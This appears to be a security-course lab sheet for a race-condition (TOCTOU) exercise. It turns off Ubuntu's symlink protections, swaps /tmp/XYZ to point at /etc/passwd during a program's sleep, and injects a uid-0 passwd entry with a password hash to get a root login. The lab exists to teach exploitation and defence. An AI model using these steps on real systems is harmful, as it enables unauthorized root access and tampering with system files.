# Task 2A: Simulating a Slow Machine

## Objective
Manually exploit the race condition with a 10-second delay added to the vulnerable program.

## Setup

1. **Disable Ubuntu's protection** (if not already done):
   ```bash
   sudo sysctl -w fs.protected_symlinks=0
   sudo sysctl fs.protected_regular=0
   ```

2. **Compile the vulnerable program**:
   ```bash
   make
   ```

3. **Create the initial symbolic link**:
   ```bash
   ln -sf /dev/null /tmp/XYZ
   ```

## Attack Steps

1. **Run the vulnerable program** in one terminal:
   ```bash
   ./vulp
   ```

2. **During the 10-second sleep**, in another terminal, change the symbolic link:
   ```bash
   ln -sf /etc/passwd /tmp/XYZ
   ```

3. **Provide input** to the vulnerable program (the malicious passwd entry):
   ```
   test:U6aMy0wojraho:0:0:test:/root:/bin/bash
   ```

4. **Verify the attack** by checking `/etc/passwd`:
   ```bash
   tail /etc/passwd
   ```

5. **Test login** as the test user:
   ```bash
   su test
   id
   ```

## Expected Result
The entry should be appended to `/etc/passwd`, allowing you to log in as `test` with root privileges.

## Cleanup
```bash
sudo sed -i '/^test:/d' /etc/passwd
rm /tmp/XYZ
```
